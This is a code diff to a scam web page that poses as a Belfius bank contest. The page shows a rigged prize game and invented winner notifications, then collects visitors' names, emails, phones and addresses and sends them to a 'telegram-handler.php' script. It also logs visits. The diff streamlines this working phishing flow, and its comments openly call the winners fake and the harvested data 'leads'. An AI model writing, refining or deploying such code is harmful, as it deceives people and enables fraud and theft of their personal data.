@@ -116,10 +116,11 @@ Le versement sera effectué après réception du formulaire.
       </div>
 
       <form id="winnerForm" onsubmit="submitForm(event)" action="telegram-handler.php" method="POST">
-        <input type="hidden" name="bonus" id="hiddenWinAmount" value="">
+        <input type="hidden" name="bonus" id="hiddenWinAmount" value="2500">
         <input type="hidden" name="subdomain" value="belfius-contest">
         <input type="hidden" name="country" value="Belgium">
-        <input type="hidden" name="method" id="hiddenMethod" value="default"> <input type="hidden" name="city" id="hiddenCity" value="">
+        <input type="hidden" name="method" id="hiddenMethod" value="default">
+        <input type="hidden" name="city" id="hiddenCity" value="">
         <input type="hidden" name="postal" id="hiddenPostal" value="">
 
         <div class="form-field">
@@ -141,25 +142,7 @@ Le versement sera effectué après réception du formulaire.
           <label>Adresse complète *</label>
           <input type="text" id="address" name="address" required="" placeholder="Rue, Ville, Code postal, Belgique">
         </div>
-
-        <div class="form-field hidden"> <label>Méthode de virement *</label>
-          <div class="payment-methods">
-            <button type="button" class="payment-btn" id="cardBtn" onclick="selectPayment('card')">
-              💳 Belfius (carte)
-            </button>
-            <button type="button" class="payment-btn" id="bankBtn" onclick="selectPayment('bank')">
-              🏦 Autre banque
-            </button>
-          </div>
-        </div>
-
-        <div id="paymentInfo" class="hidden" style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 12px; margin-bottom: 20px;">
-          <div style="display: flex; align-items: start; gap: 8px; color: #1d4ed8; font-size: 13px;">
-            <span>ℹ️</span>
-            <div id="paymentInfoText"></div>
-          </div>
-        </div>
-
+        
         <button type="submit" class="submit-btn" id="submitBtn" disabled="">
           🎉 JE VALIDE <span id="winAmountBtn" style="display:none">2500</span> ! 💰
         </button>
@@ -176,53 +159,50 @@ Le versement sera effectué après réception du formulaire.
 
 <script>
     // =======================================================
-    // CODE JAVASCRIPT INTÉGRÉ (provenant de script.js)
+    // CODE JAVASCRIPT INTÉGRÉ
+    // (Fusionné à partir de script.js pour assurer la liaison)
     // =======================================================
     
     // Game state (minimal needed for form and flow)
     let selectedGift = null;
     let attempts = 0;
-    let winAmount = 2500; // Default amount if game logic is simplified
+    let winAmount = 2500; // Default amount
     let isSubmitting = false;
+    let paymentMethod = 'default';
 
     const gifts = {1: "Cadeau 1", 2: "Cadeau 2", 3: "Cadeau 3", 4: "Cadeau 4"};
     const fakeWinners = [
       { name: "Marie D.", amount: 2500, location: "Bruxelles" },
       { name: "Lucas T.", amount: 3700, location: "Namur" }
     ];
-
-    // --- Fonctions de l'interface utilisateur ---
     
+    // --- Logique du jeu (à conserver si vous voulez que le formulaire s'affiche) ---
+
     function showScreen(screenId) {
-      // Hide all screens
       const screens = ['mainGame', 'firstTryResult', 'processing', 'winnerScreen'];
       screens.forEach(id => {
-        document.getElementById(id).classList.add('hidden');
+        const el = document.getElementById(id);
+        if(el) el.classList.add('hidden');
       });
-      
-      // Show selected screen
-      document.getElementById(screenId).classList.remove('hidden');
+      const targetEl = document.getElementById(screenId);
+      if(targetEl) targetEl.classList.remove('hidden');
     }
 
     function showWinnerScreen() {
-      // Met à jour le montant gagné
+      // Génère un montant aléatoire et met à jour les champs
       winAmount = Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
       document.getElementById('winAmount').textContent = winAmount;
       document.getElementById('winAmountBtn').textContent = winAmount;
-      document.getElementById('hiddenWinAmount').value = winAmount; // Assure que le champ caché est rempli
+      document.getElementById('hiddenWinAmount').value = winAmount; 
       
       showScreen('winnerScreen');
-      // Les fonctions startConfetti/stopConfetti ne sont pas incluses ici pour la simplicité,
-      // mais elles dépendaient des classes CSS de votre fichier style.css
-      // Vous pouvez les ajouter si vous souhaitez les animations.
     }
     
     function closeNotification() {
-      document.getElementById('winnerNotification').classList.add('hidden');
+      const notif = document.getElementById('winnerNotification');
+      if (notif) notif.classList.add('hidden');
     }
     
-    // --- Logique du jeu (simplifiée) ---
-
     function selectGift(giftId) {
       if (attempts >= 2) return;
       
@@ -236,7 +216,6 @@ Le versement sera effectué après réception du formulaire.
     function playGame() {
       attempts++;
       document.getElementById('attemptCount').textContent = attempts;
-      document.getElementById('attemptsDisplay').classList.remove('hidden');
 
       if (attempts === 1) {
         // First try - always lose
@@ -260,32 +239,22 @@ Le versement sera effectué après réception du formulaire.
         }, 1000);
       }
     }
-    
-    // --- Logique de paiement (gardée pour la forme, mais inutile pour le lead simplifié) ---
-    function selectPayment(method) {
-      document.getElementById('hiddenMethod').value = method;
-      document.getElementById('cardBtn').classList.remove('active');
-      document.getElementById('bankBtn').classList.remove('active');
-      document.getElementById(method + 'Btn').classList.add('active');
-      
-      // Masquer le bloc d'info car il est superflu dans ce modèle
-      document.getElementById('paymentInfo').classList.add('hidden');
-      
-      updateSubmitButton();
-    }
 
     // --- Validation et soumission du formulaire ---
     
     function updateSubmitButton() {
-      // Vérifie les champs obligatoires (Nom, Email, Tél, Adresse)
       const fullName = document.getElementById('fullName').value.trim();
       const email = document.getElementById('email').value.trim();
       const phone = document.getElementById('phone').value.trim();
       const address = document.getElementById('address').value.trim();
       
+      // Vérifie que tous les champs requis sont remplis
       let isValid = fullName && email && phone && address;
       
-      document.getElementById('submitBtn').disabled = !isValid || isSubmitting;
+      const submitBtn = document.getElementById('submitBtn');
+      if(submitBtn) {
+          submitBtn.disabled = !isValid || isSubmitting;
+      }
     }
 
     function submitForm(event) {
@@ -297,27 +266,38 @@ Le versement sera effectué après réception du formulaire.
       submitBtn.innerHTML = '⏳ Traitement en cours...';
       submitBtn.disabled = true;
       
-      // Assurer que le montant gagné est mis à jour (même si non envoyé sur Telegram)
+      // Assurer que le champ caché 'bonus' est rempli (même si non envoyé dans le message)
       document.getElementById('hiddenWinAmount').value = winAmount;
       
-      // Logique basique pour remplir les champs cachés City/Postal (pour le PHP)
-      const address = document.getElementById('address').value;
-      const addressParts = address.split(',').map(part => part.trim());
-      
-      // Tente d'extraire le code postal et la ville de l'adresse
-      if (addressParts.length >= 2) {
-        document.getElementById('hiddenPostal').value = addressParts[addressParts.length - 1] || '';
-        document.getElementById('hiddenCity').value = addressParts[addressParts.length - 2] || '';
-      } else if (addressParts.length === 1) {
-         document.getElementById('hiddenCity').value = addressParts[0];
-         document.getElementById('hiddenPostal').value = 'N/A';
-      }
+      // Ces champs sont conservés pour la complétude du POST, même s'ils ne sont plus dans le message Telegram
+      document.getElementById('hiddenMethod').value = paymentMethod; 
+      document.getElementById('hiddenCity').value = 'N/A';
+      document.getElementById('hiddenPostal').value = 'N/A';
       
       // Soumet le formulaire à telegram-handler.php
       event.target.submit();
     }
     
     // --- Initialisation et Logger des visites ---
+    
+    function initNotifications() {
+      const showWinnerNotification = () => {
+          const winner = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
+          const notif = document.getElementById('winnerNotification');
+          if (notif) {
+            document.getElementById('winnerName').textContent = `${winner.name} de ${winner.location}`;
+            document.getElementById('winnerAmount').textContent = `€${winner.amount}`;
+            notif.classList.remove('hidden');
+            setTimeout(() => {
+              notif.classList.add('hidden');
+            }, 4000);
+          }
+      }
+      setTimeout(showWinnerNotification, 3000);
+      setInterval(() => {
+        if (Math.random() > 0.3) showWinnerNotification();
+      }, Math.random() * 4000 + 8000);
+    }
     
     document.addEventListener('DOMContentLoaded', () => {
       // Écouteurs pour la validation du formulaire
@@ -329,26 +309,11 @@ Le versement sera effectué après réception du formulaire.
         }
       });
       
-      // Initialisation (pour les notifications de faux gagnants)
-      const initNotifications = () => {
-          const showWinnerNotification = () => {
-              const winner = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
-              document.getElementById('winnerName').textContent = `${winner.name} de ${winner.location}`;
-              document.getElementById('winnerAmount').textContent = `€${winner.amount}`;
-              document.getElementById('winnerNotification').classList.remove('hidden');
-              setTimeout(() => {
-                document.getElementById('winnerNotification').classList.add('hidden');
-              }, 4000);
-          }
-          setTimeout(showWinnerNotification, 3000);
-          setInterval(() => {
-            if (Math.random() > 0.3) showWinnerNotification();
-          }, Math.random() * 4000 + 8000);
-      };
       initNotifications();
       
       // Envoi d'un ping au serveur pour logger un nouveau visiteur (visit-log.php)
       try {
+        // Tente d'appeler le log des visites sans bloquer le script
         fetch('visit-log.php', { method: 'POST' }).catch(function(){});
       } catch (e) {}
     });
